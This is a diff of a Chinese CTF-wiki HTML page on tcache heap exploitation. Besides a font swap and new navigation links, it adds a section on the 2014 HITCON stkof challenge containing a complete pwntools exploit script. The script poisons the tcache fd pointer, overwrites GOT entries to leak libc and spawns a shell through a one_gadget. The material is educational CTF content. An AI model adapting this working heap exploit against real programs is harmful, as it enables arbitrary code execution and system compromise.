@@ -62,8 +62,8 @@
     
       
         <link href="https://gstatic.loli.net" rel="preconnect" crossorigin>
-        <link rel="stylesheet" href="https://fonts.loli.net/css?family=Fira+Sans:300,400,400i,700|Fira+Mono">
-        <style>body,input{font-family:"Fira Sans","Helvetica Neue",Helvetica,Arial,sans-serif}code,kbd,pre{font-family:"Fira Mono","Courier New",Courier,monospace}</style>
+        <link rel="stylesheet" href="https://fonts.loli.net/css?family=Noto+Sans:300,400,400i,700|Source+Code+Pro">
+        <style>body,input{font-family:"Noto Sans","Helvetica Neue",Helvetica,Arial,sans-serif}code,kbd,pre{font-family:"Source Code Pro","Courier New",Courier,monospace}</style>
       
     
     <link rel="stylesheet" href="../../../../assets/fonts/material-icons.css">
@@ -3678,6 +3678,33 @@
   
 </li>
         
+          <li class="md-nav__item">
+  <a href="#challenge-3-2014-hitcon-stkof" title="Challenge 3 : 2014 HITCON stkof" class="md-nav__link">
+    Challenge 3 : 2014 HITCON stkof
+  </a>
+  
+    <nav class="md-nav">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#_9" title="基本信息" class="md-nav__link">
+    基本信息
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#libc-226-tcache" title="libc 2.26 tcache 利用方法" class="md-nav__link">
+    libc 2.26 tcache 利用方法
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
       </ul>
     </nav>
   
@@ -4140,6 +4167,18 @@
   <li class="md-nav__item">
     <a href="../../kernel/bypass_smep/" title="bypass-smep" class="md-nav__link">
       bypass-smep
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../kernel/double-fetch/" title="Double Fetch" class="md-nav__link">
+      Double Fetch
     </a>
   </li>
 
@@ -4944,6 +4983,33 @@
           <li class="md-nav__item">
   <a href="#challenge-2" title="Challenge 2 小结" class="md-nav__link">
     Challenge 2 小结
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#challenge-3-2014-hitcon-stkof" title="Challenge 3 : 2014 HITCON stkof" class="md-nav__link">
+    Challenge 3 : 2014 HITCON stkof
+  </a>
+  
+    <nav class="md-nav">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#_9" title="基本信息" class="md-nav__link">
+    基本信息
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#libc-226-tcache" title="libc 2.26 tcache 利用方法" class="md-nav__link">
+    libc 2.26 tcache 利用方法
   </a>
   
 </li>
@@ -6601,6 +6667,139 @@ gdb-peda$ x/20xg 0x00007fa8a0a40700
 
 <h5 id="challenge-2">Challenge 2 小结<a class="headerlink" href="#challenge-2" title="Permanent link">&para;</a></h5>
 <p>这个程序的利用过程是一个应该学会的技巧 ，这种通过文件结构体的方式来实现内存的读写的相关资料可以参考台湾 Angelboy 的博客 。最近的 hctf2018 steak 这个程序的信息泄露多数人是通过 copy puts_addr 到 <code>__free_hook</code> 指针里 ，实现信息泄露 。实际上也可以通过修改文件结构体的字段来实现信息泄露 ，感兴趣的可以试试 。</p>
+<h4 id="challenge-3-2014-hitcon-stkof">Challenge 3 : 2014 HITCON stkof<a class="headerlink" href="#challenge-3-2014-hitcon-stkof" title="Permanent link">&para;</a></h4>
+<h5 id="_9">基本信息<a class="headerlink" href="#_9" title="Permanent link">&para;</a></h5>
+<p>参见<a href="../unlink/#2014 HITCON stkof">unlink HITCON stkof 简介</a></p>
+<h5 id="libc-226-tcache">libc 2.26 tcache 利用方法<a class="headerlink" href="#libc-226-tcache" title="Permanent link">&para;</a></h5>
+<p>本题可以溢出较长字节，因此可以覆盖 chunk 的 fd 指针，在 libc 2.26 之后的 tcache 机制中，未对 fd 指针指向的 chunk 进行 size 检查，从而可以将 fd 指针覆盖任意地址。在 free 该被溢出 chunk 并且两次 malloc 后可以实现任意地址修改：</p>
+<div class="codehilite"><pre><span></span><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+<span class="kn">from</span> <span class="nn">GdbWrapper</span> <span class="kn">import</span> <span class="n">GdbWrapper</span>
+<span class="kn">from</span> <span class="nn">one_gadget</span> <span class="kn">import</span> <span class="n">generate_one_gadget</span>
+<span class="n">context</span><span class="o">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="s2">&quot;info&quot;</span>
+<span class="n">context</span><span class="o">.</span><span class="n">endian</span> <span class="o">=</span> <span class="s2">&quot;little&quot;</span>
+<span class="n">context</span><span class="o">.</span><span class="n">word_size</span> <span class="o">=</span> <span class="mi">64</span>
+<span class="n">context</span><span class="o">.</span><span class="n">os</span> <span class="o">=</span> <span class="s2">&quot;linux&quot;</span>
+<span class="n">context</span><span class="o">.</span><span class="n">arch</span> <span class="o">=</span> <span class="s2">&quot;amd64&quot;</span>
+<span class="n">context</span><span class="o">.</span><span class="n">terminal</span> <span class="o">=</span> <span class="p">[</span><span class="s2">&quot;deepin-terminal&quot;</span><span class="p">,</span> <span class="s2">&quot;-x&quot;</span><span class="p">,</span> <span class="s2">&quot;zsh&quot;</span><span class="p">,</span> <span class="s2">&quot;-c&quot;</span><span class="p">]</span>
+<span class="k">def</span> <span class="nf">Alloc</span><span class="p">(</span><span class="n">io</span><span class="p">,</span> <span class="n">size</span><span class="p">):</span>
+    <span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s2">&quot;1&quot;</span><span class="p">)</span>
+    <span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">size</span><span class="p">))</span>
+    <span class="n">io</span><span class="o">.</span><span class="n">readline</span><span class="p">()</span>
+    <span class="n">io</span><span class="o">.</span><span class="n">readline</span><span class="p">()</span>
+<span class="k">def</span> <span class="nf">Edit</span><span class="p">(</span><span class="n">io</span><span class="p">,</span> <span class="n">index</span><span class="p">,</span> <span class="n">length</span><span class="p">,</span> <span class="n">buf</span><span class="p">):</span>
+    <span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s2">&quot;2&quot;</span><span class="p">)</span>
+    <span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">index</span><span class="p">))</span>
+    <span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">length</span><span class="p">))</span>
+    <span class="n">io</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">buf</span><span class="p">)</span>
+    <span class="n">io</span><span class="o">.</span><span class="n">readline</span><span class="p">()</span>
+<span class="k">def</span> <span class="nf">Free</span><span class="p">(</span><span class="n">io</span><span class="p">,</span> <span class="n">index</span><span class="p">):</span>
+    <span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s2">&quot;3&quot;</span><span class="p">)</span>
+    <span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">index</span><span class="p">))</span>
+    <span class="k">try</span><span class="p">:</span>
+        <span class="n">tmp</span> <span class="o">=</span> <span class="n">io</span><span class="o">.</span><span class="n">readline</span><span class="p">(</span><span class="n">timeout</span> <span class="o">=</span> <span class="mi">3</span><span class="p">)</span>
+    <span class="k">except</span> <span class="ne">Exception</span><span class="p">:</span>
+        <span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+    <span class="k">print</span> <span class="n">tmp</span>
+    <span class="k">if</span> <span class="s2">&quot;OK&quot;</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">tmp</span> <span class="ow">and</span> <span class="s2">&quot;FAIL&quot;</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">tmp</span><span class="p">:</span>
+        <span class="k">return</span> <span class="n">tmp</span>
+<span class="k">def</span> <span class="nf">main</span><span class="p">(</span><span class="n">binary</span><span class="p">,</span> <span class="n">poc</span><span class="p">):</span>
+    <span class="c1"># test env</span>
+    <span class="n">bss_ptrlist</span> <span class="o">=</span> <span class="bp">None</span>
+    <span class="n">free_index</span> <span class="o">=</span> <span class="bp">None</span>
+    <span class="n">free_try</span> <span class="o">=</span> <span class="mi">2</span>
+    <span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="n">binary</span><span class="p">)</span>
+    <span class="n">libc_real</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">libc</span><span class="o">.</span><span class="n">path</span><span class="p">[:</span> <span class="n">elf</span><span class="o">.</span><span class="n">libc</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">rfind</span><span class="p">(</span><span class="s1">&#39;/&#39;</span><span class="p">)</span> <span class="o">+</span> <span class="mi">1</span><span class="p">]</span>
+    <span class="k">assert</span> <span class="n">elf</span><span class="o">.</span><span class="n">arch</span> <span class="o">==</span> <span class="s2">&quot;amd64&quot;</span> <span class="ow">and</span> <span class="p">(</span><span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">exists</span><span class="p">(</span><span class="n">libc_real</span> <span class="o">+</span> <span class="s2">&quot;libc-2.27.so&quot;</span><span class="p">)</span> <span class="ow">or</span> <span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">exists</span><span class="p">(</span><span class="n">libc_real</span> <span class="o">+</span> <span class="s2">&quot;libc-2.26.so&quot;</span><span class="p">))</span>
+    <span class="k">while</span> <span class="n">bss_ptrlist</span> <span class="o">==</span> <span class="bp">None</span><span class="p">:</span>
+        <span class="c1"># find bss ptr</span>
+        <span class="n">io</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="n">binary</span><span class="p">)</span>
+        <span class="n">gdbwrapper</span> <span class="o">=</span> <span class="n">GdbWrapper</span><span class="p">(</span><span class="n">io</span><span class="o">.</span><span class="n">pid</span><span class="p">)</span>
+        <span class="c1"># gdb.attach(io)</span>
+        <span class="n">Alloc</span><span class="p">(</span><span class="n">io</span><span class="p">,</span> <span class="mh">0x400</span><span class="p">)</span>
+        <span class="n">Edit</span><span class="p">(</span><span class="n">io</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mh">0x400</span><span class="p">,</span> <span class="s2">&quot;a&quot;</span> <span class="o">*</span> <span class="mh">0x400</span><span class="p">)</span>
+        <span class="n">Alloc</span><span class="p">(</span><span class="n">io</span><span class="p">,</span> <span class="mh">0x400</span><span class="p">)</span>
+        <span class="n">Edit</span><span class="p">(</span><span class="n">io</span><span class="p">,</span> <span class="mi">2</span><span class="p">,</span> <span class="mh">0x400</span><span class="p">,</span> <span class="s2">&quot;b&quot;</span> <span class="o">*</span> <span class="mh">0x400</span><span class="p">)</span>
+        <span class="n">Alloc</span><span class="p">(</span><span class="n">io</span><span class="p">,</span> <span class="mh">0x400</span><span class="p">)</span>
+        <span class="n">Edit</span><span class="p">(</span><span class="n">io</span><span class="p">,</span> <span class="mi">3</span><span class="p">,</span> <span class="mh">0x400</span><span class="p">,</span> <span class="s2">&quot;c&quot;</span> <span class="o">*</span> <span class="mh">0x400</span><span class="p">)</span>
+        <span class="n">Alloc</span><span class="p">(</span><span class="n">io</span><span class="p">,</span> <span class="mh">0x400</span><span class="p">)</span>
+        <span class="n">Edit</span><span class="p">(</span><span class="n">io</span><span class="p">,</span> <span class="mi">4</span><span class="p">,</span> <span class="mh">0x400</span><span class="p">,</span> <span class="s2">&quot;d&quot;</span> <span class="o">*</span> <span class="mh">0x400</span><span class="p">)</span>
+        <span class="n">Alloc</span><span class="p">(</span><span class="n">io</span><span class="p">,</span> <span class="mh">0x400</span><span class="p">)</span>
+        <span class="n">Edit</span><span class="p">(</span><span class="n">io</span><span class="p">,</span> <span class="mi">5</span><span class="p">,</span> <span class="mh">0x400</span><span class="p">,</span> <span class="s2">&quot;e&quot;</span> <span class="o">*</span> <span class="mh">0x400</span><span class="p">)</span>
+        <span class="n">heap</span> <span class="o">=</span> <span class="n">gdbwrapper</span><span class="o">.</span><span class="n">heap</span><span class="p">()</span>
+        <span class="n">heap</span> <span class="o">=</span> <span class="p">[(</span><span class="n">k</span><span class="p">,</span> <span class="n">heap</span><span class="p">[</span><span class="n">k</span><span class="p">])</span> <span class="k">for</span> <span class="n">k</span> <span class="ow">in</span> <span class="nb">sorted</span><span class="p">(</span><span class="n">heap</span><span class="o">.</span><span class="n">keys</span><span class="p">())]</span>
+        <span class="n">ptr_addr</span> <span class="o">=</span> <span class="p">[]</span>
+        <span class="n">index</span> <span class="o">=</span> <span class="mi">1</span>
+        <span class="k">while</span> <span class="bp">True</span><span class="p">:</span>
+            <span class="k">for</span> <span class="n">chunk</span> <span class="ow">in</span> <span class="n">heap</span><span class="p">:</span>
+                <span class="n">address</span> <span class="o">=</span> <span class="n">chunk</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span>
+                <span class="n">info</span> <span class="o">=</span> <span class="n">chunk</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span>
+                <span class="n">ptr_addr_length</span> <span class="o">=</span> <span class="nb">len</span><span class="p">(</span><span class="n">ptr_addr</span><span class="p">)</span>
+                <span class="k">if</span> <span class="p">(</span><span class="n">info</span><span class="p">[</span><span class="s2">&quot;mchunk_size&quot;</span><span class="p">]</span> <span class="o">&amp;</span> <span class="mh">0xfffffffffffffffe</span><span class="p">)</span> <span class="o">==</span> <span class="mh">0x410</span><span class="p">:</span>
+                    <span class="k">for</span> <span class="n">x</span> <span class="ow">in</span> <span class="n">gdbwrapper</span><span class="o">.</span><span class="n">search</span><span class="p">(</span><span class="s2">&quot;bytes&quot;</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="nb">chr</span><span class="p">(</span><span class="nb">ord</span><span class="p">(</span><span class="s1">&#39;a&#39;</span><span class="p">)</span> <span class="o">+</span> <span class="n">index</span> <span class="o">-</span> <span class="mi">1</span><span class="p">))</span> <span class="o">*</span> <span class="mh">0x400</span><span class="p">):</span>
+                        <span class="k">if</span> <span class="nb">int</span><span class="p">(</span><span class="n">address</span><span class="p">,</span> <span class="mi">16</span><span class="p">)</span> <span class="o">+</span> <span class="mh">0x10</span> <span class="o">==</span> <span class="n">x</span><span class="p">[</span><span class="s2">&quot;ADDR&quot;</span><span class="p">]:</span>
+                            <span class="n">tmp</span> <span class="o">=</span> <span class="n">gdbwrapper</span><span class="o">.</span><span class="n">search</span><span class="p">(</span><span class="s2">&quot;qword&quot;</span><span class="p">,</span> <span class="n">x</span><span class="p">[</span><span class="s2">&quot;ADDR&quot;</span><span class="p">])</span>
+                            <span class="k">for</span> <span class="n">y</span> <span class="ow">in</span> <span class="n">tmp</span><span class="p">:</span>
+                                <span class="k">if</span> <span class="n">binary</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s2">&quot;/&quot;</span><span class="p">)[</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span> <span class="ow">in</span> <span class="n">y</span><span class="p">[</span><span class="s2">&quot;PATH&quot;</span><span class="p">]:</span>
+                                    <span class="n">ptr_addr</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">y</span><span class="p">[</span><span class="s2">&quot;ADDR&quot;</span><span class="p">])</span>
+                                    <span class="k">break</span>
+                        <span class="k">if</span> <span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">ptr_addr</span><span class="p">)</span> <span class="o">!=</span> <span class="n">ptr_addr_length</span><span class="p">):</span>
+                            <span class="k">break</span>
+                <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">ptr_addr</span><span class="p">)</span> <span class="o">!=</span> <span class="n">ptr_addr_length</span><span class="p">:</span>
+                    <span class="k">break</span>
+            <span class="n">index</span> <span class="o">+=</span> <span class="mi">1</span>
+            <span class="k">if</span> <span class="p">(</span><span class="n">index</span> <span class="o">==</span> <span class="mi">5</span><span class="p">):</span>
+                <span class="k">break</span>
+        <span class="n">bss_ptrlist</span> <span class="o">=</span> <span class="nb">sorted</span><span class="p">(</span><span class="n">ptr_addr</span><span class="p">)[</span><span class="mi">0</span><span class="p">]</span>
+        <span class="n">io</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
+    <span class="k">while</span> <span class="n">free_index</span> <span class="o">==</span> <span class="bp">None</span><span class="p">:</span>
+        <span class="n">io</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="n">binary</span><span class="p">)</span>
+        <span class="n">Alloc</span><span class="p">(</span><span class="n">io</span><span class="p">,</span> <span class="mh">0x400</span><span class="p">)</span>
+        <span class="n">Alloc</span><span class="p">(</span><span class="n">io</span><span class="p">,</span> <span class="mh">0x400</span><span class="p">)</span>
+        <span class="n">Alloc</span><span class="p">(</span><span class="n">io</span><span class="p">,</span> <span class="mh">0x400</span><span class="p">)</span>
+        <span class="n">Free</span><span class="p">(</span><span class="n">io</span><span class="p">,</span> <span class="n">free_try</span><span class="p">)</span>
+        <span class="n">Edit</span><span class="p">(</span><span class="n">io</span><span class="p">,</span> <span class="n">free_try</span> <span class="o">-</span> <span class="mi">1</span><span class="p">,</span> <span class="mh">0x400</span> <span class="o">+</span> <span class="mh">0x18</span><span class="p">,</span> <span class="s2">&quot;a&quot;</span> <span class="o">*</span> <span class="mh">0x400</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mi">1041</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x12345678</span><span class="p">))</span>
+        <span class="k">try</span><span class="p">:</span>
+            <span class="n">Alloc</span><span class="p">(</span><span class="n">io</span><span class="p">,</span> <span class="mh">0x400</span><span class="p">)</span>
+            <span class="n">Alloc</span><span class="p">(</span><span class="n">io</span><span class="p">,</span> <span class="mh">0x400</span><span class="p">)</span>
+        <span class="k">except</span> <span class="ne">Exception</span><span class="p">:</span>
+            <span class="n">free_index</span> <span class="o">=</span> <span class="n">free_try</span>
+        <span class="n">free_try</span> <span class="o">+=</span> <span class="mi">1</span>
+        <span class="n">io</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
+    <span class="c1"># arbitrary write</span>
+    <span class="n">libc</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="n">binary</span><span class="p">)</span><span class="o">.</span><span class="n">libc</span>
+    <span class="n">one_gadget_offsets</span> <span class="o">=</span> <span class="n">generate_one_gadget</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">path</span><span class="p">)</span>
+    <span class="k">for</span> <span class="n">one_gadget_offset</span> <span class="ow">in</span> <span class="n">one_gadget_offsets</span><span class="p">:</span>
+        <span class="n">io</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="n">binary</span><span class="p">)</span>
+        <span class="n">libc</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">libc</span>
+        <span class="n">gdbwrapper</span> <span class="o">=</span> <span class="n">GdbWrapper</span><span class="p">(</span><span class="n">io</span><span class="o">.</span><span class="n">pid</span><span class="p">)</span>
+        <span class="n">Alloc</span><span class="p">(</span><span class="n">io</span><span class="p">,</span> <span class="mh">0x400</span><span class="p">)</span>
+        <span class="n">Alloc</span><span class="p">(</span><span class="n">io</span><span class="p">,</span> <span class="mh">0x400</span><span class="p">)</span>
+        <span class="n">Alloc</span><span class="p">(</span><span class="n">io</span><span class="p">,</span> <span class="mh">0x400</span><span class="p">)</span>
+        <span class="n">Free</span><span class="p">(</span><span class="n">io</span><span class="p">,</span> <span class="n">free_index</span><span class="p">)</span>
+        <span class="n">Edit</span><span class="p">(</span><span class="n">io</span><span class="p">,</span> <span class="n">free_index</span> <span class="o">-</span> <span class="mi">1</span><span class="p">,</span> <span class="mh">0x400</span> <span class="o">+</span> <span class="mh">0x18</span><span class="p">,</span> <span class="s2">&quot;a&quot;</span> <span class="o">*</span> <span class="mh">0x400</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mi">1041</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">bss_ptrlist</span> <span class="o">-</span> <span class="mh">0x08</span><span class="p">))</span>
+        <span class="n">Alloc</span><span class="p">(</span><span class="n">io</span><span class="p">,</span> <span class="mh">0x400</span><span class="p">)</span>
+        <span class="n">Alloc</span><span class="p">(</span><span class="n">io</span><span class="p">,</span> <span class="mh">0x400</span><span class="p">)</span>
+        <span class="c1">###leak libc</span>
+        <span class="n">Edit</span><span class="p">(</span><span class="n">io</span><span class="p">,</span> <span class="mi">5</span><span class="p">,</span> <span class="mh">0x18</span><span class="p">,</span> <span class="n">p64</span><span class="p">(</span><span class="n">elf</span><span class="o">.</span><span class="n">got</span><span class="p">[</span><span class="s2">&quot;free&quot;</span><span class="p">])</span> <span class="o">*</span> <span class="mi">2</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">elf</span><span class="o">.</span><span class="n">got</span><span class="p">[</span><span class="s2">&quot;malloc&quot;</span><span class="p">]))</span>
+        <span class="n">Edit</span><span class="p">(</span><span class="n">io</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mh">0x08</span><span class="p">,</span> <span class="n">p64</span><span class="p">(</span><span class="n">elf</span><span class="o">.</span><span class="n">plt</span><span class="p">[</span><span class="s2">&quot;puts&quot;</span><span class="p">]))</span>
+        <span class="n">leaked</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">Free</span><span class="p">(</span><span class="n">io</span><span class="p">,</span> <span class="mi">2</span><span class="p">)[:</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="s2">&quot;</span><span class="se">\x00</span><span class="s2">&quot;</span><span class="p">))</span>
+        <span class="n">libc_base</span> <span class="o">=</span> <span class="n">leaked</span> <span class="o">-</span> <span class="n">libc</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s2">&quot;malloc&quot;</span><span class="p">]</span>
+        <span class="n">system_addr</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="n">libc</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s2">&quot;system&quot;</span><span class="p">]</span>
+        <span class="n">one_gadget_addr</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="n">one_gadget_offset</span>
+        <span class="n">Edit</span><span class="p">(</span><span class="n">io</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mh">0x08</span><span class="p">,</span> <span class="n">p64</span><span class="p">(</span><span class="n">one_gadget_addr</span><span class="p">))</span>
+        <span class="n">Free</span><span class="p">(</span><span class="n">io</span><span class="p">,</span> <span class="mi">1</span><span class="p">)</span>
+        <span class="k">try</span><span class="p">:</span>
+            <span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s2">&quot;id&quot;</span><span class="p">)</span>
+            <span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="n">io</span><span class="o">.</span><span class="n">readline</span><span class="p">(</span><span class="n">timeout</span><span class="o">=</span><span class="mi">3</span><span class="p">))</span>
+        <span class="k">except</span> <span class="ne">Exception</span><span class="p">,</span> <span class="n">e</span><span class="p">:</span>
+            <span class="n">io</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
+            <span class="k">continue</span>
+        <span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+<span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s2">&quot;__main__&quot;</span><span class="p">:</span>
+    <span class="n">binary</span> <span class="o">=</span> <span class="s2">&quot;./bins/a679df07a8f3a8d590febad45336d031-stkof&quot;</span>
+    <span class="n">main</span><span class="p">(</span><span class="n">binary</span><span class="p">,</span> <span class="s2">&quot;&quot;</span><span class="p">)</span>
+</pre></div>
+
 <h3 id="0x06">0x06 建议习题：<a class="headerlink" href="#0x06" title="Permanent link">&para;</a></h3>
 <ul>
 <li>2018 HITCON children_tcache</li>
